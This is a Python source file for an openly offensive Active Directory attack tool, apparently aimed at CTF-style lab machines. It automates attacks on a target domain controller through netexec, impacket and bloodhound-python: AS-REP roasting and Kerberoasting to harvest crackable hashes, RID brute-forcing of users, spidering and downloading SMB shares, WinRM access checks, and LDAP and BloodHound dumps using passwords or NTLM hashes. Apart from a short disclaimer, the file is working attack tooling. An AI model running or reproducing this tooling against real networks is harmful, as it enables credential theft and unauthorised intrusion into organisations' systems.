from pathlib import Path
from urllib.parse import urlparse
import argparse
import ipaddress
import ntplib
import re
import shlex
import shutil
import socket
import subprocess

RED = "\033[1;31m"
BLUE = "\033[1;34m"
RESET = "\033[0m"
GREEN = "\033[1;32m"
PURPLE = "\033[1;35m"
ORANGE = "\033[1;33m"
PINK = "\033[1;35m"

########## MESSAGES ##########


def display_banner():
    print(
        f"""{GREEN}

        	         ██████╗██╗ ██████╗ █████╗ ██████╗  █████╗                    
                        ██╔════╝██║██╔════╝██╔══██╗██╔══██╗██╔══██╗                   
                        ██║     ██║██║     ███████║██║  ██║███████║                   
                        ██║     ██║██║     ██╔══██║██║  ██║██╔══██║                   
                        ╚██████╗██║╚██████╗██║  ██║██████╔╝██║  ██║                   
                         ╚═════╝╚═╝ ╚═════╝╚═╝  ╚═╝╚═════╝ ╚═╝  ╚═╝   
                                {ORANGE}|__ by - theblxckcicada __|{GREEN}               

        ███╗   ███╗ █████╗ ███████╗████████╗███████╗██████╗ ████████╗██╗   ██╗██╗     
        ████╗ ████║██╔══██╗██╔════╝╚══██╔══╝██╔════╝██╔══██╗╚══██╔══╝██║   ██║██║     
        ██╔████╔██║███████║███████╗   ██║   █████╗  ██████╔╝   ██║   ██║   ██║██║     
        ██║╚██╔╝██║██╔══██║╚════██║   ██║   ██╔══╝  ██╔══██╗   ██║   ██║   ██║██
        ██║ ╚═╝ ██║██║  ██║███████║   ██║   ███████╗██║  ██║   ██║   ╚██████╔╝███████╗
        ╚═╝     ╚═╝╚═╝  ╚═╝╚══════╝   ╚═╝   ╚══════╝╚═╝  ╚═╝   ╚═╝    ╚═════╝ ╚══════╝                                                                          
        	{RESET}{display_disclaimer()}"""
    )


def display_disclaimer():
    return f"""
           {ORANGE}| Disclaimer |                                                                                       |
                        | {RED}Usage of this pentest tool implies understanding and acceptance of potential risks,   {ORANGE}|
                        | {RED}and the user assumes full responsibility for their actions.                           {ORANGE}|
           {RESET}"""


def display_hunt_message():
    print(f"{RESET}{PURPLE}{'-'*16}{GREEN}H{ORANGE}A{BLUE}P{RED}P{GREEN}Y{ORANGE} {BLUE}H{RED}A{GREEN}U{ORANGE}N{BLUE}T{RED}I{GREEN}N{ORANGE}G{BLUE}!{RED}!{PURPLE}{'-'*16}{PURPLE}{RESET}")


def seperator(length=48, color=RESET):
    print(f"{color}{'-'*length}{RESET}")


def display_args_info(ip):
    display_hunt_message()
    print(f"Target IP: {ORANGE}{ip}{RESET}")
    if args.domain:
        print(f"Domain: {ORANGE}{args.domain}{RESET}")
    print(f'Username: {ORANGE}{args.username or "null"}{RESET}')
    print(f'Password: {ORANGE}{args.password or "null"}{RESET}')
    if args.ntlm_hash:
        print(f"NTLM Hash: {ORANGE}{args.ntlm_hash}{RESET}")
    if args.full:
        print(f"\n{BLUE}Full Mode Enabled{RESET}")
    else:
        print()
        if args.kerberos:
            print(f"{BLUE}Kerberoasting Mode Enabled{RESET}")
        else:
            if args.lookupsid:
                print(f"{BLUE}Lookupsid Mode Enabled{RESET}")
            if args.npusers:
                print(f"{BLUE}GetNPUsers Mode Enabled{RESET}")
            if args.userspn:
                print(f"{BLUE}GetUserSPNs Mode Enabled{RESET}")

        if args.ldap:
            print(f"{BLUE}LDAP Mode Enabled{RESET}")
        if args.smb:
            print(f"{BLUE}SMB Mode Enabled{RESET}")
        if args.winrm:
            print(f"{BLUE}WinRM Mode Enabled{RESET}")
        if args.bloodhound:
            print(f"{BLUE}Bloodhound Mode Enabled{RESET}")
    seperator()


########## WORKSPACE ##########


def workspace_get_names(ip: str) -> dict[str, dict[str, Path]]:
    """
    mastertool
    └── 10.10.11.34
        ├── bloodhound_results
        ├── ldap_results
        ├── kerberos_results
        │   ├── GetNPUsers_results.txt
        │   ├── GetUserSPNs_results.txt
        ├── lookupsid_results
        │   ├── lookupsid_file.txt
        │   └── users.txt
        └── smb_results
            └── smb
                ├── share_drives.txt
                └── share_names.txt
    """
    cwd = Path.cwd()
    base_dir = cwd / "mastertool" / ip

    dirs = {
        "cwd": cwd,
        "base": base_dir,
        "smb": base_dir / "smb_results",
        "ldap": base_dir / "ldap_results",
        "lookup_sids": base_dir / "lookupsid_results",
        "kerberos": base_dir / "kerberos_results",
        "bloodhound": base_dir / "bloodhound_results",
    }

    files = {
        "kerberos": {
            "np_users": dirs["kerberos"] / "GetNPUsers_results.txt",
            "snp_users": dirs["kerberos"] / "GetUserSPNs_results.txt",
        },
        "lookup_sids": {
            "lookup_sids": dirs["lookup_sids"] / "lookupsid.txt",
            "users": dirs["lookup_sids"] / "users.txt",
        },
        "smb": {
            "share_drives": dirs["smb"] / "share_drives.txt",
            "share_names": dirs["smb"] / "share_names.txt",
        },
    }

    return {"dirs": dirs, "files": files}


def workspace_init(workspace=None, ip=None) -> Path:
    if not workspace and ip:
        workspace = workspace_get_names(ip)

    dirs, files = workspace.values()

    for dir_ in dirs.values():
        Path(dir_).mkdir(parents=True, exist_ok=True)

    for dir_ in files.values():
        for file in dir_.values():
            Path(file).touch(exist_ok=True)

    return dirs["base"]


def workspace_cleanup(directory: Path):
    print(f"{BLUE}[!x!] Cleaning up...{RESET}")
    for file_path in directory.rglob("*"):
        if file_path.is_file() and file_path.stat().st_size == 0:
            file_path.unlink()  # Delete the file

    # Remove empty directories (bottom-up)
    for dir_path in sorted(
        directory.rglob("*"), key=lambda p: len(p.parts), reverse=True
    ):
        if dir_path.is_dir() and not any(dir_path.iterdir()):
            dir_path.rmdir()  # Delete the directory


########## SHELL ##########


def gen_netexec_cmd(username, password, password_hash, ip, domain, service, cmd):
    server = domain if domain else ip
    command = f"netexec {service} {server} --timeout 99 -u '{username}' "
    command += f"-H '{password_hash}'" if password_hash else f"-p '{password}'"
    command += f" {cmd}"
    if args.kerberos:
        command += ' -k'
    return command


def run_command(command):
    command = f"faketime -f +{args.faketime}h " + command
    print(f"{PINK}[~] Commnad: {command}{RESET}")
    try:
        output = subprocess.run(
            shlex.split(command),
            stdout=subprocess.PIPE,
            stderr=subprocess.PIPE,
            text=True,
        )
        return output.stdout, output.stderr
    except Exception as error:
        return "", str(error)


########## UTILS ##########


def get_faketime(server):
    skew = ntplib.NTPClient().request(server, version=3).offset
    return int(round(skew / (60 * 60)))


def save_to_file(filename, data):
    with open(filename, "w") as f:
        f.write(data)

def netexec_ldap_dump_to_html(output):
    def row(attr, value):
        value = value.replace('<', '&lt;').replace('>', '&gt;').replace('&', '&amp;')
        return f'<tr><td>{attr}</td><td class="val">{value}</td></tr>'

    def table(title, rows):
        return f'<h3>{title}</h3><table><tr><th>Attribute</th><th>Value</th></tr>{rows}</table>'

    template = '''
    <html>
    <head><title>LDAP Dump</title><style>
        table { width: 100%;  border-collapse: collapse; }
        th { border: 1px solid black; padding: 8px; text-align: left; white-space: nowrap; }
        td { border: 1px solid black; padding: 8px; text-align: left;}
        .val { word-break: break-word; } 
        th { background-color: #f2f2f2; }

    </style></head>
    <body>
    <h1>LDAP Dump Results</h1>
    '''

    rows = ''
    for line in output.strip().split('\n'):
        line = line.split(maxsplit=4)[-1]
        if '[+]' in line:
            template += table(title=line, rows=rows)
            rows = ''
            continue
        
        if ':' not in line:
            continue

        attr, value = map(str.strip, line.split(':', 1))
        rows += row(attr, value)

    template += '</body></html>'
    return template


def parse_and_resolve(ip_or_url):
    try:
        # Check if the input is a valid IP address
        ip = ipaddress.ip_address(ip_or_url)
        return str(ip)  # Return the IP if it's valid
    except ValueError:
        # If not an IP, assume it's a URL and extract the domain
        parsed_url = urlparse(ip_or_url)
        domain = parsed_url.netloc or parsed_url.path  # Handle cases like "example.com"

        if not domain:
            raise ValueError("Invalid input: Not a valid IP or URL")

        try:
            # Resolve the domain to an IP address
            ip = socket.gethostbyname(domain)
            return ip
        except socket.gaierror:
            raise ValueError(f"Could not resolve domain: {domain}")


########## COMMANDS ##########


def gen_impacket_access(username, password, password_hash, server, domain):
    access = ""
    if domain:
        if domain.count('.') > 1:
            domain = domain.split('.', 1)[1]
        
        if username and password:
            access = f"'{domain}'/'{username}':'{password}'@'{server}' "
        elif username and password_hash:
            access = f"'{domain}'/'{username}'@'{server}' -hashes :{password_hash} "
        elif not password:
            access = f"'{domain}'/'{username}'@'{server}' -no-pass "
    else:
        if username and password:
            access = f"'{username}':'{password}'@'{server}' "
        elif username and password_hash:
            access = f"'{username}'@'{server}' -hashes :{password_hash} "
        elif not username or not password:
            access = f"'{username}'@'{server}' -no-pass "

    return access


def get_NPUsers(username, password, password_hash, server, domain):
    print(f"{PURPLE}[!] Enumerating NPUsers using impacket...{RESET}")
    users_file = workspace["files"]["lookup_sids"]["users"]
    krb_hash_prefix = "$krb5asrep"
    command = f"impacket-GetNPUsers {gen_impacket_access(username,password,password_hash,server,domain)} -usersfile {args.usersfile or users_file} "
    output, error = run_command(command)

    if error:
        print(error)
        return

    output_hashes = [line for line in output.split("\n") if krb_hash_prefix in line]
    np_users_file = workspace["files"]["kerberos"]["np_users"]
    if krb_hash_prefix in output:
        # TODO: Test
        # save_to_file(np_users_file, output_hashes.split('/usr')[0])
        save_to_file(np_users_file, output_hashes)
        print(f"{GREEN}[+] Saved NPUsers hashes to {np_users_file}{RESET}")
    else:
        print(f"{RED}[-] No NPUsers found{RESET}")


def get_UserSPNs(username, password, hash, server, domain):
    print(f"{PURPLE}[!] Enumerating UserSPNs using impacket...{RESET}")
    krb_hash_prefix = "$krb5tgs"
    command = f"impacket-GetUserSPNs {gen_impacket_access(username,password,hash,server,domain)} -request"
    if domain:
        command += f' -dc-host {domain}'
    if args.kerberos:
        command += ' -k'

    output, error = run_command(command)
    if error:
        print(error)
        return

    np_users_file = workspace["files"]["kerberos"]["snp_users"]
    if krb_hash_prefix in output:
        # TODO: Test
        # save_to_file(np_users_file,results.split('/usr')[0])
        save_to_file(np_users_file, output)
        print(f"{GREEN}[+] Saved UserSPNs hashes to {np_users_file}{RESET}")
    else:
        print(f"{RED}[-] No UserSPNs found")


def enum_smb(username, password, password_hash, ip, domain):
    print(f"{PURPLE}[!] Enumerating SMB...{RESET}")
    command = gen_netexec_cmd(username, password, password_hash, ip, domain, "smb", "--shares")
    
    output, error = run_command(command)
    if error:
        print(error)
        return

    pattern = r"\b(\w+)\s+READ\b"
    matches = re.findall(pattern, output)

    # Remove escape sequences and extract share names from the matches
    share_names = [match for match in matches if match.upper() != "PERMISSIONS"]

    # save share names to file
    result_string = "\n".join(share_names)
    share_names_txt = workspace["files"]["smb"]["share_names"]
    save_to_file(share_names_txt, result_string)
    print(f"{GREEN}[+] SMB share drive names saved to {share_names_txt}{RESET}")

    # save crackmap results to file
    share_drives_txt = workspace["files"]["smb"]["share_drives"]
    save_to_file(share_drives_txt, output)
    print(f"{GREEN}[+] SMB share drives list saved to {share_drives_txt}{RESET}")

    # Download smb files
    if len(share_names) > 0:
        workspace_smb = workspace["dirs"]["smb"]
        workspace_spider = workspace_smb / "spider"

        print(f"{ORANGE}[*] Downloading SMB share files to {workspace_smb}{RESET}")
        command = gen_netexec_cmd(username, password, password_hash, ip, domain, "smb", "-M spider_plus -o DOWNLOAD_FLAG=True")
        server = ip # domain if domain else ip

        output, error = run_command(command)
        if error:
            print(error)
            return

        save_path = Path("/tmp/nxc_hosted/nxc_spider_plus")
        if workspace_spider.exists():
            shutil.rmtree(workspace_spider)
        shutil.move(save_path / server, workspace_spider)
        shutil.move(save_path / f"{server}.json", workspace_smb / "spider.json")
    else:
        print(f"{RED}[-] No read permissions on SMB shares {RESET}")


def enum_winrm(username, password, password_hash, ip, domain):
    print(f"{PURPLE}{PURPLE}[!] Connecting to WinRM...{RESET}")
    command = gen_netexec_cmd(username, password, password_hash, ip, domain, "winrm", "")
    output, error = run_command(command)
    if error:
        print(error)
        return

    if "Pwn3d" in output:
        print(f"{GREEN}[+] Connected to WinRM{RESET}")
    else:
        print(f"{RED}[-] Could not connect to WinRM{RESET}")


def enum_lookupsid(username, password, password_hash, ip, domain):
    print(f"{PURPLE}[!] Enumerating users with netexec rib bruteforce (up to 5000)...{RESET}")
    command = gen_netexec_cmd(username, password, password_hash, ip, domain, "smb", "--rid-brute 5000")

    output, error = run_command(command)
    if error:
        print(error)
        return

    lookupsid_file = workspace["files"]["lookup_sids"]["lookup_sids"]
    users_file = workspace["files"]["lookup_sids"]["users"]
    if "[-] SMB SessionError:" in output:
        print(f"{RED}[-] Could not find domain sids{RESET}")
    else:
        save_to_file(lookupsid_file, output)
        print(f"{GREEN}[+] Lookupsids saved to {lookupsid_file}{RESET}")
        output_usernames = ""
        for line in output.split("\n"):
            if "SidTypeUser" not in line:
                continue
            output_usernames += line.split()[5].split("\\")[1] + "\n"

        save_to_file(users_file, output_usernames)
        print(f"{GREEN}[+] Users list saved to {users_file}{RESET}")


def enum_ldap(username, password, password_hash, ip, domain):
    print(f"{PURPLE}[!] Enumerating LDAP...{RESET}")
    ldap_dir = workspace["dirs"]["ldap"]
    if args.kerberos:
        command = gen_netexec_cmd(username, password, password_hash, ip, domain, "ldap", '--query "(objectclass=*)" ""')

        output, error = run_command(command)
        if error:
            print(error)
            return

        ldap_output_txt = ldap_dir / 'results.txt'
        ldap_output_html = ldap_dir / 'results.html'
        save_to_file(ldap_output_txt, output)
        print(f"{GREEN}[+] LDAP saved to {ldap_output_txt}{RESET}")
        save_to_file(ldap_output_html, netexec_ldap_dump_to_html(output))
        print(f"{GREEN}[+] LDAP saved to {ldap_output_html}{RESET}")
    else:
        if domain and username:
            command = (f"ldapdomaindump -u '{domain}\\{username}' -dc-ip {ip} -o {ldap_dir} ")
            if password:
                command += f"-p '{password}'"
            elif password_hash:
                command += f"-p ':{password_hash}'"
            else:
                print(f"{RED}[-] Could not connect to LDAP{RESET}")
                return
        else:
            print(f"{RED}[-] Could not connect to LDAP{RESET}")
            return

        run_command(command)

        files = list(ldap_dir.glob("*"))
        if len(files) == 0:
            print(f"{RED}[-] Could not connect to LDAP{RESET}")
            return

        print(f"{GREEN}[+] LDAP saved to {ldap_dir}{RESET}")
        for file in files:
            extension = file.suffix.lstrip(".").lower()

            extension_dir = ldap_dir / extension
            extension_dir.mkdir(exist_ok=True)

            file.rename(extension_dir / file.name)


def enum_bloodhound(username, password, password_hash, server, domain):
    print(f"{PURPLE}[!] Collecting Bloodhound Files...{RESET}")
    if domain.count('.') > 1:
        domain = domain.split('.', 1)[1]
    
    command = f"bloodhound-python -d {domain} -u '{username}' -ns {server} -c all --dns-timeout 100 --zip -op {username} "
    if username and password:
        command += f"-p '{password}'"
    elif username and password_hash:
        command = f"--hashes '{password_hash}'"

    run_command(command)

    files = list(workspace["dirs"]["cwd"].glob("*.zip"))
    bloodhound_dir = workspace["dirs"]["bloodhound"]
    if len(files) == 0:
        print(f"{RED}[-] Could not collect Bloodhound Files{RESET}")
        return

    for file in files:
        shutil.move(file, bloodhound_dir)

    print(f"{GREEN}[+] Bloodhound saved to {bloodhound_dir}")


def handle_request(username, password, password_hash, server, domain):
    if args.full: 
        enum_smb(username, password, password_hash, server, domain) 
        enum_winrm(username, password, password_hash, server, domain)
        enum_lookupsid(username, password, password_hash, server, domain)
        get_NPUsers(username, password, password_hash, server, domain)
        get_UserSPNs(username, password, password_hash, server, domain)
        enum_bloodhound(username, password, password_hash, server, domain)
        enum_ldap(username, password, password_hash, server, domain)
    else:
        if args.lookupsid:
            enum_lookupsid(username, password, password_hash, server, domain)
        
        if args.npusers:
            get_NPUsers(username, password, password_hash, server, domain)
        
        if args.userspn:
            get_UserSPNs(username, password, password_hash, server, domain)

        if args.smb:
            enum_smb(username, password, password_hash, server, domain)

        if args.winrm:
            enum_winrm(username, password, password_hash, server, domain)

        if args.ldap:
            enum_ldap(username, password, password_hash, server, domain)

        if args.bloodhound:
            enum_bloodhound(username, password, password_hash, server, domain)

        if args.npusers and not args.kerberos:
            get_NPUsers(username, password, password_hash, server, domain)

        if args.userspn and not args.kerberos:
            get_UserSPNs(username, password, password_hash, server, domain)


if __name__ == "__main__":
    parser = argparse.ArgumentParser(description='Script description')
    parser.add_argument('-t', '--target', help='Target host or IP address')
    parser.add_argument('-d', '--domain', help='Domain name of the target machine')
    parser.add_argument('-u', '--username', help='Username for authentication', default='')
    parser.add_argument('-p', '--password', help='Password for authentication', default='')
    parser.add_argument('-H', '--ntlm-hash', help='NTLM Hash for authentication', default='')
    parser.add_argument('-us', '--usersfile', help='List of domain users', default='')
    parser.add_argument('-k', '--kerberos', action='store_true', help='Enable kerberoasting mode', default=False)
    parser.add_argument('--lookupsid', action='store_true', help='Enable lookupsid mode', default=False)
    parser.add_argument('--npusers', action='store_true', help='Enable GetNPUsers mode', default=False)
    parser.add_argument('--userspn', action='store_true', help='Enable GetUserSPNs mode', default=False)
    parser.add_argument('--ldap', action='store_true', help='Enable LDAP mode Enumeration', default=False)
    parser.add_argument('--smb', action='store_true', help='Enable SMB mode Enumeration', default=False)
    parser.add_argument('--full', action='store_true', help='Enable full mode Enumeration', default=False)
    parser.add_argument('--winrm', action='store_true', help='Enable winrm mode Enumeration', default=False)
    parser.add_argument('--bloodhound', action='store_true', help='Enable bloodhound mode Enumeration', default=False)
    parser.add_argument('-q', '--quiet', action='store_true', help='Show banner of script', default=False)
    
    args = parser.parse_args()

    if not args.quiet:
        display_banner()

    if not args.target and not args.domain:
        print('Missing target...')
        parser.print_help()
        exit(1)

    args.target = parse_and_resolve(args.target) if args.target else parse_and_resolve(args.domain)
    args.faketime = get_faketime(args.target)

    workspace = workspace_get_names(args.target)
    workspace_init(workspace)

    display_args_info(args.target)

    handle_request(args.username,args.password,args.ntlm_hash,args.target,args.domain)

    workspace_cleanup(workspace['dirs']['base'])

    if not args.quiet:
        output, _ = run_command(f"tree {workspace['dirs']['base']}")
        print(output)
